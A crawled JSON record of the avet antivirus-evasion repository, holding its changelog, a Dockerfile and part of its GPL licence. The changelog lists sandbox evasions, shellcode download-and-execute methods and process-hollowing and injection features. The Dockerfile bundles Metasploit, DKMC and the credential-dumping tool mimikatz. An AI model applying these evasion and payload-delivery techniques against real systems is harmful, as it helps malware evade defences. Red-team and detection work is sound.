{
  "metadata": {
    "timestamp": 1736568516304,
    "page": 521,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjUyOQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "govolution/avet",
      "stars": 1668,
      "defaultBranch": "master",
      "files": [
        {
          "name": "CHANGELOG",
          "type": "blob",
          "size": 6.501953125,
          "content": "CHANGELOG\n---------\nVersion 2.4.1\n\t+++ CHANGES +++\n\t- added has_process_exit\n\t- added quick and dirty support for compiling with c++\n\n\nVersion 2.4\n\t+++ CHANGES +++\n\t- added adversarial examples vs. static machine learning detectors (credits go to Thund3rPat)\n\t- 3 new sandbox evasions\n\t- new build script to test all current available sandbox evasions\n\t- minor bug fixes\n\n\nVersion 2.3\n\t+++CHANGES +++\n\t- switch to Mingw-Crosscompiler\n\t- add Dockerfile which encapsulates Metasploit and Avet\n\t- 23 new Sandbox Evasions\n\t- setup script can download dependencies\n\n\nVersion 2.2\n\t+++ CHANGES +++\n\t- Generated executables are now named after their buildscripts instead of \"output.exe\".\n\t- added \"build_script_tester.py\", a script which executes all build scripts and fetch error messages.\n\t- Usage of executables is now echoed to screen\n\t- replace \"avet_fabric.py\" with \"avet.py\". \"avet.py\" helps new users to configure and build scripts without changing the orignal build script.\n\t- new build scripts structure with tags(tags are only relevant for avet.py)\n\t- adjust setup to work with Kali 2020.1\n\t- updated tdm-gcc to version 9.2.0\n\t- added curl as download method\n\n\nVersion 2.1\n\n    +++ KNOWN ISSUES +++\n    - DKMC integration still not working properly, probably due to corrupt shellcode.\n    - when built as a service, debug logging into file does not work. this is probably a permission problem.\n\n    +++ CHANGES +++\n    - enacted build script naming reform, so that the most prominent feature is mentioned first in the script name\n    - added RC4 encoder/decoder\n    - pe_to_shellcode integration, which enables using .exe files as input by converting them into callable shellcode\n    - added ability to execute cmd/powershell command payloads at sample startup. these payloads are compatible with the built-in data retrieval methods.\n    - added static_from_here retrieval method to specify static inputs directly in the build script\n    - added ability to supply arguments for evasion techniques directly in the build script, e.g. specifying fopen file target\n    - added bitsadmin data retrieval method\n    - added environmental checks for sandbox evasion: checking VM MAC, number of CPU cores, checking VM registry keys\n    - example build scripts for new features\n    - general bugfixes and improvements\n\n\nVersion 2\n\n    +++ KNOWN ISSUES +++\n\t- downloadexecshellcode_DKMC not working properly. DKMC probably delivers corrupt shellcode, needs further investigation.\n    - when built as a service, debug logging into file does not work. this is probably a permission problem.\n\n\t+++ CHANGES +++\n\n    General rebuild:\n\t- major folder restructuring, code is now more modular:\n\t\t* sources are now gathered in the source folder\n\t\t* modularized shellcode binding methods\n\t\t* modularized evasion techniques\n\t\t* modularized encoders/decoders\n\t\t* modularized data retrieval methods\n\t- bundled basic data conversion and file interaction functions in data_utility.h\n\t- moved sh_format utility into tools folder\n\t- added data_raw_to_c tool that converts raw shellcode into c-array style for static source file includes\n\t- added supreme ASCII art banner as text file, which can be printed in build scripts when using AVET\n\t- structured files generated by AVET into new input and output folders\n\t- implemented bash function interface in feature_construction.sh, which provides a simple language to be used in build scripts for easier configuration\n\t- removed make_avet, the complete AVET executable generation is now configured in the build script language\n\t- updated build scripts to use the new construction language\n\t- added global connect config for generalized LHOST and LPORT settings in payloads\n\t- completely redesigned avet.c to support the new modular configuration options\n\t- reimplemented avetsvc.c based on new avet.c\n\t- removed make_avetsvc\n\t- implemented new debug output macro that makes code more readable\n\t- integrated old sh_format utility as avet encoder/decoder module\n\t- added xor encoder/decoder\n\t- added key generation utility to ease encoder use\n\t- generalized shellcode retrieval as data retrieval, so that retrieval methods can be used for all imported data, such as encryption keys\n\t- fixed several data retrieval methods so that they are more robust in execution and more readable in code\n\t- implemented new data retrieval methods\n\t- major code commenting offensive\n\t- bugfixes\n\n    BFG integration (BFG project:   https://github.com/govolution/bfg)\n    - major renaming from \"shellcode\" into \"payload\" in sources and scripts\n    - introduced new data retrieval category get_payload_info, where parameters such as target process PID can be delivered for hollowing, injection etc.\n    - added reset_evasion_tecnhnique_counter build script function to support compilation of multiple payloads in one build script\n    - integrated process hollowing for 32 and 64 bit targets from BFG, including new build scripts\n    - integrated shellcode injection for 32 and 64 bit targets from BFG, including new build scripts\n    - integrated dll injection for 32 and 64 bit targets from BFG, including new build scripts\n\n\tFor details, consider the commit messages.\n\n\nVersion 1.3\n- downloading shellcode using powershell or certutil\n- downloading shellcode into memory and exec from memory\n- added more build scripts for new options\n\nVersion 1.2\n- AVET now has support for metasploits psexec\n- basic support for metasploits ASCII encoder, more to come\n- of cource more build scripts\n- support for msf ASCII call via cmd\n- added \"killswitch\" (gethostbyname) evasion technique\n- added -q for quiet mode (hiding window)\n\nVersion 1.1\n- avet_fabric for assisted execution of the build scripts\n- more cleanup of avet.c\n- removed all options from avet.c itself for reducing codebase (less detectable in the future)\n- added options from avet to make_avet\n- added build scripts\n- added -F for explicit fopen sandbox escape\n- added -X for 64 bit support\n- added -E for explicit usage of avets ASCII encoder\n  users now can use shellcode encoders without avets ASCII encoder\n- fixed compiler warning in make_avet.c\n\nVersion 1.0\n- cleanup and reduce code base of avet.c\n- added to public github repo\n- tested with Kali 2 and update README\n- made GPL\n\nVersion 0.4\n- translate almost everything to English\n- added some documentation\n- changed ASCII art\n- rewrite some parts for easier usage\n- added -f option to make_avet\n- added evasion with read file from c:\\windows\\system.ini\n- added build.sh\n\nVersion 0.3\n- make_avet added\n\nVersion 0.2\n- -u works with Windows 7\n- -p for debugging\n\nVersion 0.1\n- -f works with Windows XP and Windows 7\n- -u works with Windows XP\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 2.0107421875,
          "content": "# v0.1\n#\n# This Dockerfile encapsulates the Metasploit Framework and Avet.\n#\n# Also included:\n# hasherezade/pe_to_shellcode\n# Mr-Un1k0d3r/DKMC\n# gentilkiwi/mimikatz\n#\n# To build this run:\n# $ sudo docker build -t avet:v0.1 .\n#\n# To start this:\n# $ sudo docker run -it --net=host --env=\"DISPLAY\" --volume=\"$HOME/.Xauthority:/root/.Xauthority:rw\" -v $(pwd):/tools/avet/output avet:v0.1 /bin/bash\n# (alias this)\n#\n# This mounts the Current Working directory as a Docker Volume and attach it to /avet/output.\n# To be save, choose an empty directory to prevent overriding files.\n#\n# Right now, the only option to configure the build scripts inside the Container\n# is using avet.py or with vim/nano/gedit in /avet/build\n# You can also install other editors if you like\n#\n\n\nFROM debian:buster\n\n# Preparation\nARG DEBIAN_FRONTEND=noninteractive\n\nRUN dpkg --add-architecture i386 && apt-get update && apt-get install -y \\\n\twget \\\n\tcurl \\\n\tgit \\\n\tunzip \\\n\tjq \\\n\tapt-utils \\\n\tgnupg2 \\\n\tvim \\\n\tnano \\\n\tgedit \\\n\twine \\\n\twine32 \\\n\tpython \\\n\tpython3 \\\n\tmingw-w64 \\\n\t&& rm -rf /var/lib/apt/lists/*\n\n\n# For metasploit\nRUN echo 'deb http://apt.metasploit.com/ buster main' > /etc/apt/sources.list.d/metasploit-framework.list\nRUN wget -O - http://apt.metasploit.com/metasploit-framework.gpg.key | apt-key add -\n\nRUN apt-get update && apt-get install -y \\\n\tmetasploit-framework \\\n\t&& rm -rf /var/lib/apt/lists/*\n\n\n# For avet\nWORKDIR /tools/avet\nCOPY . .\n\n\n# For pe2shc\nWORKDIR /tools/pe_to_shellcode\nRUN curl -s https://api.github.com/repos/hasherezade/pe_to_shellcode/releases/latest \\\n\t| jq -r '.assets[].browser_download_url' \\\n\t| grep 'pe2shc' \\\n\t| wget -i -\n\n\n# For mimikatz\nWORKDIR /tools/mimikatz\nRUN curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest \\\n\t| jq -r '.assets[].browser_download_url' \\\n\t| grep .'zip' \\\n\t| wget -i - \\\n\t&& unzip mimikatz_trunk.zip \\\n\t&& cp x64/mimikatz.exe /tools/avet/input\n\n\n# For dkmc\nWORKDIR /tools\nRUN git clone https://github.com/Mr-Un1k0d3r/DKMC.git\n\n\n# configure wine during build\nRUN winecfg\n\n\nWORKDIR /tools/avet\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3232421875,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 